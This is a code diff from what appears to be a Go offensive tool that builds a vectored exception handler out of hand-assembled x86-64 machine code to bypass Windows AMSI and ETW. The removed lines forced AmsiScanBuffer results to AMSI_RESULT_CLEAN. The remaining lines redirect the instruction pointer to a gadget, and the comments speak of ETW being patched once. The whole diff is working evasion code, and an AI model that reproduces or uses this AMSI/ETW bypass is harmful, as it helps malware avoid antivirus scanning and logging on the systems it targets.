@@ -246,22 +246,6 @@ func buildNativeVEHHandler(amsiAddr, etwAddr uintptr) (handlerAddr uintptr, data
 	// every AmsiScanBuffer call. ETW is one-shot because Go runtime threads
 	// call EtwEventWrite frequently and repeated VEH invocations cause crashes.
 
-	// Load context.Rsp into rax: rax = [rbx+0x98]
-	code = append(code, 0x48, 0x8B, 0x83)             // mov rax, [rbx+0x98]
-	code = append(code, 0x98, 0x00, 0x00, 0x00)       // disp32 = 0x98 (Rsp)
-	// Load AMSI_RESULT* from [rax+0x30]: rax = [rax+0x30]
-	code = append(code, 0x48, 0x8B, 0x40, 0x30)       // mov rax, [rax+0x30]
-	// Null-check the pointer before dereferencing
-	code = append(code, 0x48, 0x85, 0xC0)             // test rax, rax
-	code = append(code, 0x74) // jz skip_result_write (rel8)
-	jzSkipResultOffset := len(code)
-	code = append(code, 0x00) // placeholder
-	// Write AMSI_RESULT_CLEAN (0) to *result: [rax] = 0
-	code = append(code, 0xC7, 0x00, 0x00, 0x00, 0x00, 0x00) // mov dword [rax], 0
-	// skip_result_write:
-	skipResultTarget := len(code)
-	code[jzSkipResultOffset] = byte(skipResultTarget - jzSkipResultOffset - 1)
-
 	// Load gadget address from data block: rax = [r13+0x10]
 	code = append(code, 0x49, 0x8B, 0x45, 0x10)       // mov rax, [r13+0x10]
 	// Set context.Rip to gadget address: [rbx+0xF8] = rax
